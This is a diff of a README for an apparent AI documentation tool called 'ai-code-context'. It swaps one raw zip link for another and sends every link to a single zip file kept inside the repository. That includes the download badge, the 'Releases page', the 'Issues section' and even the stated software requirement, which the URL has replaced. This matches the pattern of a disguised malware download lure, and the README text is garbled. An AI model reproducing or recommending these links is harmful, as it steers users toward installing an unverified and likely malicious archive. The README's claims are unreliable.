@@ -1,7 +1,7 @@
 # 🤖 ai-code-context - Effortlessly Generate Contextual Documentation
 
 ## 📥 Download Now
-[![Download ai-code-context](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip)](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip)
+[![Download ai-code-context](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip)](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **ai-code-context**! This tool helps you create and maintain code documentation using AI. It automatically generates relevant documentation based on your code changes. 
@@ -13,14 +13,14 @@ Welcome to **ai-code-context**! This tool helps you create and maintain code doc
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or later, macOS, or a Linux distribution (Ubuntu preferred).
-- **https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip**: Version 14 or higher must be installed. You can download it [here](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip).
+- **https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip**: Version 14 or higher must be installed. You can download it [here](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip).
 - **Internet Connection**: Required for AI features.
 
 ## 📋 Installation Steps
 Follow these steps to download and install **ai-code-context**.
 
 1. **Visit the Download Page**
-   Go to [the Releases page](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip) to find the latest version of **ai-code-context**.
+   Go to [the Releases page](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip) to find the latest version of **ai-code-context**.
 
 2. **Download the Application**
    Click on the download link for the latest version. You will see options for different operating systems. Choose the one that matches your system.
@@ -63,9 +63,9 @@ A: Yes, ai-code-context processes your data locally. It does not send any of you
 A: While some features may require an internet connection for AI functionalities, basic documentation generation can work offline.
 
 ## 📬 Support
-For any additional questions or support, feel free to open an issue on the [Issues section](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip).
+For any additional questions or support, feel free to open an issue on the [Issues section](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip).
 
 ## 🎯 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip) and follow the steps outlined above for installation. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip) and follow the steps outlined above for installation. 
 
-[![Download ai-code-context](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip)](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/xerophytically/ai-code-context.zip)
+[![Download ai-code-context](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip)](https://raw.githubusercontent.com/Jimartskenya/ai-code-context/main/tests/ai_context_code_3.6.zip)
